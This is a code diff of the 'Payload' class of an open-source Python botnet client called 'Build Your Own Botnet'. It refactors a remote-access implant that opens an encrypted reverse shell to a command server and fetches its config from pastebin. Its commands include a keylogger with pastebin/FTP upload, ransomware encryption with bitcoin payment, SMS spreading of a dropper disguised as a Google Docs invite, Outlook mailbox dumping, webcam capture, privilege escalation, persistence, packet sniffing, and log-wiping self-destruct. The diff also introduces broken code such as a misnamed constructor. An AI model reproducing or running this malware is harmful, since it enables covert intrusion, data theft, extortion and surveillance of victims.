@@ -9,9 +9,6 @@ from __future__ import print_function
 # standard libarary
 import os
 import sys
-import mss
-import cv2
-import wmi
 import time
 import json
 import zlib
@@ -24,17 +21,11 @@ import pickle
 import struct
 import socket
 import random
-import ftplib
 import urllib
-import twilio
-import pyHook
 import urllib2
 import marshal
 import zipfile
-import _winreg
 import logging
-import win32com
-import pythoncom
 import itertools
 import functools
 import threading
@@ -51,6 +42,14 @@ import Crypto.Hash.SHA256
 import Crypto.PublicKey.RSA
 import Crypto.Cipher.PKCS1_OAEP
 
+# Windows
+if os.name is 'nt':
+    import wmi
+    import pyHook
+    import _winreg
+    import win32com
+    import pythoncom
+
 # byob
 import util
 import crypto
@@ -60,7 +59,6 @@ class PayloadError(Exception):
     pass
 
 
-
 class Payload():
     """
     Payload (Build Your Own Botnet)
@@ -68,19 +66,19 @@ class Payload():
     _debug   = bool()
     _abort   = bool()
 
-    def __init__(self, config=None, debug=True):
+    def _init__(self, config=None, debug=True):
         """
         create a Payload instance
         """
-        self._jobs      = Queue.Queue()
-        self._flags     = {'connection': threading.Event(), 'mode': threading.Event(), 'prompt': threading.Event()}
-        self._workers   = collections.OrderedDict()
-        self.session    = collections.OrderedDict()
-        self.info       = collections.OrderedDict()
-        self.commands   = self._commands()
+        self.jobs      = Queue.Queue()
+        self.flags     = {'connection': threading.Event(), 'mode': threading.Event(), 'prompt': threading.Event()}
+        self.workers   = collections.OrderedDict()
+        self.session   = collections.OrderedDict()
+        self.info      = collections.OrderedDict()
+        self.commands  = self.commands()
 
 
-    def _commands(self):
+    def commands(self):
         commands = {}
         for cmd in vars(Payload):
             if hasattr(vars(Payload)[cmd], 'command') and getattr(vars(Payload)[cmd], 'command'):
@@ -91,137 +89,28 @@ class Payload():
                         'usage': getattr(Payload, cmd).usage,
                         'description': getattr(Payload, cmd).func_doc.strip().rstrip()}
                 except Exception as e:
-                    Payload.debug("{} error: {}".format(self._commands.func_name, str(e)))
+                    Payload.debug("{} error: {}".format(self.commands.func_name, str(e)))
         return commands
     
 
-
-    def _ps_list(self, *args, **kwargs):
+    def send(self, **kwargs):
         try:
-            output  = {}
-            for i in os.popen('tasklist' if os.name is 'nt' else 'ps').read().splitlines()[3:]:
-                pid = i.split()[1 if os.name is 'nt' else 0]
-                exe = i.split()[0 if os.name is 'nt' else -1]
-                if exe not in output:
-                    if len(json.dumps(output)) < 48000:
-                        output.update({pid: exe})
-                    else:
-                        break
-            return json.dumps(output)
-        except Exception as e:
-            util.debug("{} error: {}".format(self._ps_list.func_name, str(e)))
-
-
-    def _ps_search(self, arg):
-        try:
-            if not isinstance(arg, str) or not len(arg):
-                return "usage: process search [PID/name]"
-            output  = {}
-            for i in os.popen('tasklist' if os.name is 'nt' else 'ps').read().splitlines()[3:]:
-                pid = i.split()[1 if os.name is 'nt' else 0]
-                exe = i.split()[0 if os.name is 'nt' else -1]
-                if arg in exe:
-                    if len(json.dumps(output)) < 48000:
-                        output.update({pid: exe})
-                    else:
-                        break
-            return json.dumps(output)
-        except Exception as e:
-            util.debug("{} error: {}".format(self._ps_search.func_name, str(e)))
-
-
-    def _ps_kill(self, arg):
-        try:
-            output  = {}
-            for i in os.popen('tasklist' if os.name is 'nt' else 'ps').read().splitlines()[3:]:
-                pid = i.split()[1 if os.name is 'nt' else 0]
-                exe = i.split()[0 if os.name is 'nt' else -1]
-                if str(arg).isdigit() and int(arg) == int(pid):
-                    try:
-                        _ = os.popen('taskkill /pid %s /f' % pid if os.name is 'nt' else 'kill -9 %s' % pid).read()
-                        output.update({str(arg): "killed"})
-                    except:
-                        output.update({str(arg): "not found"})
-                else:
-                    try:
-                        _ = os.popen('taskkill /im %s /f' % exe if os.name is 'nt' else 'kill -9 %s' % exe).read()
-                        output.update({str(p.name()): "killed"})
-                    except Exception as e:
-                        Payload.debug(str(e))
-                return json.dumps(output)
-        except Exception as e:
-            util.debug("{} error: {}".format(self._ps_kill.func_name, str(e)))
-
-
-    @util.threaded
-    def _ps_monitor(self, arg):
-        try:
-            if not len(self.ps.buffer.getvalue()):
-                self.ps.buffer.write("Time, User , Executable, PID, Privileges\n")
-            pythoncom.CoInitialize()
-            c = wmi.WMI()
-            self._workers[self._ps_logger.func_name] = self._ps_logger()
-            process_watcher = c.Win32_Process.watch_for("creation")
-            while True:
-                try:
-                    new_process = process_watcher()
-                    proc_owner  = new_process.GetOwner()
-                    proc_owner  = "%s\\%s" % (proc_owner[0],proc_owner[2])
-                    create_date = new_process.CreationDate
-                    executable  = new_process.ExecutablePath
-                    pid         = new_process.ProcessId
-                    parent_pid  = new_process.ParentProcessId
-                    output      = '"%s", "%s", "%s", "%s", "%s"\n' % (create_date, proc_owner, executable, pid, parent_pid)
-                    if not keyword:
-                        self.ps.buffer.write(output)
-                    else:
-                        if keyword in output:
-                            self.ps.buffer.write(output)
-                except Exception as e1:
-                    util.debug("{} error: {}".format(self._ps_monitor.func_name, str(e1)))
-                if self._abort:
-                    break
-        except Exception as e2:
-            util.debug("{} error: {}".format(self._ps_monitor.func_name, str(e2)))
-
-
-    @util.threaded
-    def _ps_logger(self, *args, **kwargs):
-        try:
-            while True:
-                if self.ps.buffer.tell() > self.ps.max_bytes:
-                    try:
-                        result = util.pastebin(self.ps.buffer) if 'ftp' not in args else self._Upload_ftp(self.ps.buffer)
-                        self._task_save('process monitor', result)
-                        self.ps.buffer.reset()
-                    except Exception as e:
-                        util.debug("{} error: {}".format(self._ps_logger.func_name, str(e)))
-                elif self._abort:
-                    break
-                else:
-                    time.sleep(5)
-        except Exception as e:
-            util.debug("{} error: {}".format(self._ps_logger.func_name, str(e)))
-
-
-    def _send(self, **kwargs):
-        try:
-            if self._flags['connection'].wait(timeout=1.0):
+            if self.flags['connection'].wait(timeout=1.0):
                 if kwargs.get('result'):
                     buff = kwargs.get('result')
                     kwargs.update({'result': buff[:48000]})
-                data = self._aes_encrypt(json.dumps(kwargs), self.session['key'])
+                data = self.aes_encrypt(json.dumps(kwargs), self.session['key'])
                 self.session['socket'].send(struct.pack('L', len(data)) + data)
                 if len(buff[48000:]):
                     kwargs.update({'result': buff[48000:]})
-                    return self._send(**kwargs)
+                    return self.send(**kwargs)
             else:
                 util.debug("connection timed out")
         except Exception as e:
-            util.debug('{} error: {}'.format(self._send.func_name, str(e)))
+            util.debug('{} error: {}'.format(self.send.func_name, str(e)))
 
 
-    def _recv(self, sock=None):
+    def recv(self, sock=None):
         if not sock:
             sock = self.session['socket']
         header_size = struct.calcsize('L')
@@ -235,14 +124,14 @@ class Payload():
                 break
         if data and bytes(data):
             try:
-                text = self._aes_decrypt(data, self.session['key'])
+                text = self.aes_decrypt(data, self.session['key'])
                 task = json.loads(text)
                 return task
             except Exception as e2:
-                util.debug('{} error: {}'.format(self._recv.func_name, str(e2)))
+                util.debug('{} error: {}'.format(self.recv.func_name, str(e2)))
 
 
-    def _api(self, *args, **kwargs):
+    def _connect_api(self, *args, **kwargs):
         ip   = socket.gethostbyname(socket.gethostname())
         port = kwargs.get('port') if ('port' in kwargs and str(kwargs.get('port')).isdigit()) else 1337
         try:
@@ -255,48 +144,48 @@ class Payload():
                     try:
                         ip  = json.loads(res)['main_ip']
                         if not util.ipv4(ip):
-                            util.debug("{} returned invalid IPv4 address: '{}'".format(self._get_server_addr.func_name, str(ip)))
+                            util.debug("{} returned invalid IPv4 address: '{}'".format(self.get_server_addr.func_name, str(ip)))
                     except Exception as e1:
-                        util.debug("{} error: {}".format(self._addr.func_name, str(e1)))
+                        util.debug("{} error: {}".format(self.addr.func_name, str(e1)))
                 else:
-                    util.debug("{} error: missing API resources for finding active server".format(self._addr.func_name))
+                    util.debug("{} error: missing API resources for finding active server".format(self.addr.func_name))
         except Exception as e2:
-            util.debug("{} error: {}".format(self._addr.func_name, str(e2)))
-            return self.restart(self._addr.func_name)
+            util.debug("{} error: {}".format(self.addr.func_name, str(e2)))
+            return self.restart(self.addr.func_name)
         util.debug("Connecting to {}:{}...".format(ip, port))
         return ip, port
 
 
-    def _connect(self, **kwargs):
+    def _connect_direct(self, **kwargs):
         try:
-            host, port = self._addr(**kwargs)
+            host, port = self.addr(**kwargs)
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect((host, port))
             sock.setblocking(True)
-            self._flags['connection'].set()
+            self.flags['connection'].set()
             return sock
         except Exception as e:
-            util.debug("{} error: {}".format(self._connect.func_name, str(e)))
-            return self.restart(self._connect.func_name)
+            util.debug("{} error: {}".format(self.connect.func_name, str(e)))
+            return self.restart(self.connect.func_name)
 
 
     @util.threaded
-    def _prompt(self, *args, **kwargs):
-        self._flags['prompt'].set()
+    def prompt(self, *args, **kwargs):
+        self.flags['prompt'].set()
         while True:
             try:
-                self._flags['prompt'].wait()
-                self._send(**{'id': '0'*64, 'client': self.info['uid'], 'command': 'prompt', 'result': '[%d @ {}]>'.format(os.getcwd())})
-                self._flags['prompt'].clear()
+                self.flags['prompt'].wait()
+                self.send(**{'id': '0'*64, 'client': self.info['uid'], 'command': 'prompt', 'result': '[%d @ {}]>'.format(os.getcwd())})
+                self.flags['prompt'].clear()
             except Exception as e:
                 util.debug("{} error: {}".format(self.prompt.func_name, str(e)))
-                self._flags['prompt'].clear()
+                self.flags['prompt'].clear()
 
 
-    def _session_id(self):
+    def session_id(self):
         try:
-            if self._flags['connection'].wait(timeout=3.0):
-                self.session['socket'].sendall(self._aes_encrypt(json.dumps(self.info), self.session['key']) + '\n')
+            if self.flags['connection'].wait(timeout=3.0):
+                self.session['socket'].sendall(self.aes_encrypt(json.dumps(self.info), self.session['key']) + '\n')
                 buf      = ""
                 attempts = 1
                 while '\n' not in buf:
@@ -310,7 +199,7 @@ class Payload():
                         else:
                             break
                 if buf:
-                    return self._aes_decrypt(buf.rstrip(), self.session['key']).strip().rstrip()
+                    return self.aes_decrypt(buf.rstrip(), self.session['key']).strip().rstrip()
             else:
                 util.debug("{} timed out".format(self.session_id.func_name))
         except Exception as e:
@@ -318,9 +207,9 @@ class Payload():
         return self.restart(self.session_id.func_name)
 
 
-    def _session_key(self):
+    def session_key(self):
         try:
-            if self._flags['connection'].wait(timeout=3.0):
+            if self.flags['connection'].wait(timeout=3.0):
                 g  = 2
                 p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
                 a  = Crypto.Util.number.bytes_to_long(os.urandom(32))
@@ -336,29 +225,19 @@ class Payload():
         return self.restart(self.session_key.func_name)
 
 
-    def _task_save(self, task):
-        if isinstance(task, dict):
-            task.update({"completed": int(time.time())})
-            try:
-                self._results.put_nowait(task)
-            except Exception as e:
-                util.debug("{} error: {}".format(self._task_save.func_name, str(e)))
-        else:
-            util.debug("{} error: invallid input type - expected '{}', received '{}'".format(self._task_save.func_name, dict, type(task)))
-
     @util.threaded
     @util.config(flag=threading.Event())
-    def _task_manager(self):
+    def task_manager(self):
         try:
             while True:
-                if self._abort:
+                if self.abort:
                     break
                 else:
-                    self._task_manager.flag.wait()
-                    jobs = self._workers.items()
+                    self.task_manager.flag.wait()
+                    jobs = self.workers.items()
                     for task, worker in jobs:
                         if not worker.is_alive():
-                            dead = self._workers.pop(task, None)
+                            dead = self.workers.pop(task, None)
                             del dead
                     time.sleep(1)
         except Exception as e:
@@ -560,11 +439,11 @@ class Payload():
 
 
     @util.config(platforms=['win32','linux2','darwin'], command=True, usage='sms <send/read> [args]')
-    def sms(self, args):
+    def phone(self, args):
         """
         text all host contacts with links to a dropper disguised as Google Docs invite
         """
-        if 'sms' in globals():
+        if 'phone' in globals():
             mode, _, args = str(args).partition(' ')
             if 'send' in mode:
                 phone_number, _, message = args.partition(' ')
@@ -620,15 +499,15 @@ class Payload():
         shutdown the current connection and reset session
         """
         try:
-            self._flags['connection'].clear()
-            self._flags['prompt'].clear()
+            self.flags['connection'].clear()
+            self.flags['prompt'].clear()
             self.session['socket'].shutdown(socket.SHUT_RDWR)
             self.session['socket'].close()
             self.session['socket'] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             self.session['id'] = str()
             self.session['key'] = str()
             self.session['public_key'] = str()
-            workers = self._workers.keys()
+            workers = self.workers.keys()
             for worker in workers:
                 try:
                     self.stop(worker)
@@ -665,7 +544,7 @@ class Payload():
         try:
             attribute = str(attribute)
             if 'jobs' in attribute:
-                return json.dumps({a: util.status(self._workers[a].name) for a in self._workers if self._workers[a].is_alive()})
+                return json.dumps({a: util.status(self.workers[a].name) for a in self.workers if self.workers[a].is_alive()})
             elif 'privileges' in attribute:
                 return json.dumps({'username': self.info.get('username'),  'administrator': 'true' if bool(os.getuid() == 0 if os.name is 'posix' else ctypes.windll.shell32.IsUserAnAdmin()) else 'false'})
             elif 'info' in attribute:
@@ -687,7 +566,7 @@ class Payload():
             else:
                 return self.show.usage
         except Exception as e:
-            util.debug("'{}' error: {}".format(self._workers.func_name, str(e)))
+            util.debug("'{}' error: {}".format(self.workers.func_name, str(e)))
 
 
     @util.config(platforms=['win32','linux2','darwin'], command=True, usage='stop <job>')
@@ -696,8 +575,8 @@ class Payload():
         stop a running job
         """
         try:
-            if target in self._workers:
-                _ = self._workers.pop(target, None)
+            if target in self.workers:
+                _ = self.workers.pop(target, None)
                 del _
                 return "Job '{}' was stopped.".format(target)
             else:
@@ -711,10 +590,12 @@ class Payload():
         """
         portscan the network to find online hosts and open ports
         """
+        if 'portscan' not in globals():
+            return "Error: missing module 'portscan'"
         try:
             args = str(args).split()
             host = [i for i in args if util.ipv4(i)][0] if len([i for i in args if util.ipv4(i)]) else self.info.get('local')
-            return self._portscan_network(host) if 'network' in args else self._portscan_host(host)
+            return self.portscan_network(host) if 'network' in args else self.portscan_host(host)
         except Exception as e:
             util.debug("{} error: {}".format(self.portscan.func_name, str(e)))
 
@@ -734,8 +615,8 @@ class Payload():
             return "File '{}' not found".format(path)
 
 
-    @util.config(platforms=['win32','darwin'], inbox=collections.OrderedDict(), command=True, usage='email <option> [mode]')
-    def email(self, args=None):
+    @util.config(platforms=['win32','darwin'], command=True, usage='outlook <option> [mode]')
+    def outlook(self, args=None):
         """
         access Outlook email without authenticating or opening the GUI
         """
@@ -743,22 +624,22 @@ class Payload():
             return "Error: missing module 'outlook'"
         if not args:
             try:
-                pythoncom.CoInitialize()
-                installed = win32com.Payload.Dispatch('Outlook.Application').GetNameSpace('MAPI')
-                return "\tOutlook is installed on this host\n\t{}".format(self.email.usage)
+                if not outlook.installed()
+                    return "Error: Outlook not installed on this host"
             except: pass
-            return "Outlook not installed on this host"
         else:
             try:
                 mode, _, arg   = str(args).partition(' ')
                 if hasattr(self, '_email_%s' % mode):
-                    if 'dump' in mode:
-                        self._workers[self._email_dump.func_name] = threading.Thread(target=self._email_dump, kwargs={'n': arg}, name=time.time())
-                        self._workers[self._email_dump.func_name].daemon = True
-                        self._workers[self._email_dump.func_name].start()
+                    if 'dump' in mode or 'upload' in mode:
+                        self.workers['outlook'] = threading.Thread(target=getattr(outlook, mode), kwargs={'n': arg}, name=time.time())
+                        self.workers['outlook'].daemon = True
+                        self.workers['outlook'].start()
                         return "Dumping emails from Outlook inbox"
+                    elif hasattr(outlook, mode):
+                        return getattr(outlook, mode)()
                     else:
-                        return getattr(self, '_email_%s' % mode)(arg)
+                        return "Error: invalid mode '%s'" % mode
                 else:
                     return "usage: email <dump/search> [ftp/pastebin]"
             except Exception as e:
@@ -777,15 +658,15 @@ class Payload():
         cmd, _, action = str(args).partition(' ')
         if 'payment' in cmd:
             try:
-                payment = self._resource('api bitcoin ransom_payment')
-                return self._ransom_payment(payment)
+                payment = self.resource('api bitcoin ransom_payment')
+                return ransom.payment(payment)
             except:
                 return "{} error: {}".format(Payload._ransom_payment.func_name, "bitcoin wallet required for ransom payment")
         elif 'decrypt' in cmd:
-            return self._ransom_decrypt_threader(action)
+            return ransom.decrypt_threader(action)
         elif 'encrypt' in cmd:
             reg_key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, registry_key)
-            return self._ransom_encrypt_threader(action)
+            return ransom.encrypt_threader(action)
         else:
             return "\tusage: ransom <mode> [path]\n\tmodes: encrypt, decrypt, payment"
 
@@ -813,6 +694,8 @@ class Payload():
         try:
             if not args:
                 result = self.webcam.usage
+            elif 'webcam' not in globals():
+                return "Error: missing module 'webcam'"
             else:
                 args = str(args).split()
                 if 'stream' in args:
@@ -821,9 +704,9 @@ class Payload():
                     elif not str(args[1]).isdigit():
                         result = "Error - port must be integer between 1 - 65355"
                     else:
-                        result = self._webcam_stream(port=args[1])
+                        result = webcam.stream(port=args[1])
                 else:
-                    result = self._webcam_image(*args) if 'video' not in args else self._webcam_video(*args)
+                    result = webcam.image(*args) if 'video' not in args else webcam.video(*args)
         except Exception as e:
             result = "{} error: {}".format(self.webcam.func_name, str(e))
         return result
@@ -835,13 +718,12 @@ class Payload():
         attempt to escalate privileges
         """
         try:
-            if self._get_administrator():
+            if util.administrator():
                 return "Current user '{}' has administrator privileges".format(self.info.get('username'))
-            if self._clients.get('established') and os.path.isfile(self._clients.get('result')):
-                if os.name is 'nt':
-                    win32com.shell.shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(self._clients.get('result')))
-                else:
-                    return "Privilege escalation not yet available on '{}'".format(sys.platform)
+            if os.name is 'nt':
+                win32com.shell.shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(self.clients.get('result')))
+            else:
+                return "Privilege escalation not yet available on '{}'".format(sys.platform)
         except Exception as e:
             util.debug("{} error: {}".format(self.escalate.func_name, str(e)))
 
@@ -880,34 +762,34 @@ class Payload():
             return "Error: missing module 'keylogger'"
         mode = args[0] if args else None
         if not mode:
-            if keylogger.func_name not in self._workers:
+            if 'keylogger' not in self.workers:
                 return keylogger.usage
             else:
-                return keylogger._status()
+                return keylogger.status()
         else:
             if 'run' in mode:
-                if keylogger.func_name not in self._workers:
-                    self._workers[keylogger.func_name] = keylogger.run()
-                    return keylogger._status()
+                if 'keylogger' not in self.workers:
+                    keylogger.workers['keylogger'] = keylogger.run()
+                    return keylogger.status()
                 else:
-                    return keylogger._status()
+                    return keylogger.status()
             elif 'stop' in mode:
                 try:
-                    self.stop(keylogger.func_name)
+                    self.stop('keylogger')
                 except: pass
                 try:
-                    self.stop(keylogger._auto.func_name)
+                    self.stop('keylogger')
                 except: pass
-                return keylogger._status()
+                return keylogger.status()
             elif 'auto' in mode:
-                self._workers[keylogger._auto.func_name] = keylogger._auto()
-                return keylogger._status()
+                self.workers['keylogger'] = keylogger.auto()
+                return keylogger.status()
             elif 'dump' in mode:
-                result = util.pastebin(keylogger.buffer) if not 'ftp' in mode else util.ftp(keylogger.buffer)
+                result = util.pastebin(keylogger._buffer) if not 'ftp' in mode else util.ftp(keylogger._buffer)
                 keylogger.buffer.reset()
                 return result
             elif 'status' in mode:
-                return keylogger._status()
+                return keylogger.status()
             else:
                 return keylogger.usage + '\n\targs: start, stop, dump'
             
@@ -918,15 +800,15 @@ class Payload():
         persistence methods - all, registry_key, scheduled_task, launch_agent, crontab_job, startup_file, hidden_file
         """
         try:
-            if not args:
+            if not 'persistence' in globals():
+                return "Error: missing module 'persistence'"
+            elif not args:
                 return self.persistence.usage
             else:
                 cmd, _, action = str(args).partition(' ')
                 methods = [m for m in persistence.methods if sys.platform in persistence.methods[m]['platforms']]
                 if cmd not in ('add','remove'):
                     return self.persistence.usage + str('\nmethods: %s' % ', '.join([str(m) for m in persistence.methods if sys.platform in getattr(Payload, '_persistence_add_%s' % m).platforms]))
-                if not len(self._clients):
-                    self._clients.append(self.client(random.choice(['java','flash','chrome','firefox'])))
                 for method in methods:
                     if method == 'all' or action == method:
                         persistence.methods[method]['established'], persistence.methods[method]['result'] = getattr(self, '_'.join(cmd, method))()
@@ -952,7 +834,7 @@ class Payload():
                     length = int(arg)
                 elif arg in ('ftp','pastebin'):
                     mode   = arg
-            self._workers[self.packetsniffer.func_name] = packetsniffer(seconds=length, mode=mode)
+            self.workers[self.packetsniffer.func_name] = packetsniffer(mode, seconds=length)
             return 'Capturing network traffic for {} seconds'.format(duration)
         except Exception as e:
             return "{} error: {}".format(self.packetsniffer.func_name, str(e))
@@ -964,12 +846,14 @@ class Payload():
         process utilities - mode: block, list, monitor, kill, search
         """
         try:
-            if not args:
+            if 'process' not in globals():
+                return "Error: missing module 'process'"
+            elif not args:
                 return self.ps.usage
             else:
                 cmd, _, action = str(args).partition(' ')
-                if hasattr(self, '_ps_%s' % cmd):
-                    return getattr(self, '_ps_%s' % cmd)(action)
+                if hasattr(process, cmd):
+                    return getattr(process, cmd)(action) if action else getattr(process, cmd)()
                 else:
                     return "usage: {}\n\tmode: block, list, search, kill, monitor\n\targs: name".format(self.ps.usage)
         except Exception as e:
@@ -981,7 +865,7 @@ class Payload():
         """
         self-destruct and leave no trace on the disk
         """
-        self._abort = True
+        self.abort = True
         try:
             if os.name is 'nt':
                 util.clear_system_logs()
@@ -992,10 +876,10 @@ class Payload():
                             remove = getattr(self, '_persistence_remove_{}'.format(method))()
                         except Exception as e2:
                             util.debug("{} error: {}".format(method, str(e2)))
-            if not self._debug:
+            if not self.debug:
                 util.delete(sys.argv[0])
         finally:
-            shutdown = threading.Thread(target=self._get_shutdown)
+            shutdown = threading.Thread(target=self.get_shutdown)
             taskkill = threading.Thread(target=self.ps, args=('kill python',))
             shutdown.start()
             taskkill.start()
@@ -1008,10 +892,10 @@ class Payload():
         send encrypted shell back to server via outgoing TCP connection
         """
         try:
-            self._workers[self._prompt.func_name] = self._prompt()
+            self.workers[self.prompt.func_name] = self.prompt()
             while True:
-                if self._flags['connection'].wait(timeout=1.0):
-                    if not self._flags['prompt'].is_set():
+                if self.flags['connection'].wait(timeout=1.0):
+                    if not self.flags['prompt'].is_set():
                         task = self.recv()
                         if isinstance(task, dict):
                             cmd, _, action = [i.encode() for i in task['command'].partition(' ')]
@@ -1021,9 +905,9 @@ class Payload():
                                 result  = "{} error: {}".format(self.reverse_tcp_shell.func_name, str(e1))
                             task.update({'result': result})
                             self.send(**task)
-                            if cmd and cmd in self._flags['tasks'] and 'PRIVATE KEY' not in task['command']:
-                                self._task_save(task, result)
-                        self._flags['prompt'].set()
+                            if cmd and cmd in self.flags['tasks'] and 'PRIVATE KEY' not in task['command']:
+                                self.task_save(task, result)
+                        self.flags['prompt'].set()
                 else:
                     util.debug("Connection timed out")
                     break
@@ -1037,7 +921,7 @@ class Payload():
         connect to server and start new session
         """
         try:
-            self.session['socket'] = self._connect(**kwargs)
+            self.session['socket'] = self._connect_api(**kwargs) if len(kwargs) else self._connect_direct()
             self.session['key']    = self.session_key()
             self.session['id']     = self.session_id()
             return True
@@ -1052,8 +936,8 @@ class Payload():
         """
         try:
             if self.connect(**kwargs):
-                self._workers[self._task_manager.func_name]     = self._task_manager()
-                self._workers[self.reverse_tcp_shell.func_name] = self.reverse_tcp_shell()
+                self.workers[self.task_manager.func_name]     = self.task_manager()
+                self.workers[self.reverse_tcp_shell.func_name] = self.reverse_tcp_shell()
                 
             else:
                 util.debug("connection timed out")
@@ -1068,6 +952,5 @@ def main(*args, **kwargs):
     payload.run(**kwargs)
     return payload
 
-
-#if __name__ == "__main__":
-#    payload = main(config='https://pastebin.com/raw/uYGhnVqp', debug=bool('debug' in sys.argv or '--debug' in sys.argv))
+if __name__ == "__main__":
+    payload = main(config='https://pastebin.com/raw/uYGhnVqp', debug=bool('debug' in sys.argv or '--debug' in sys.argv))
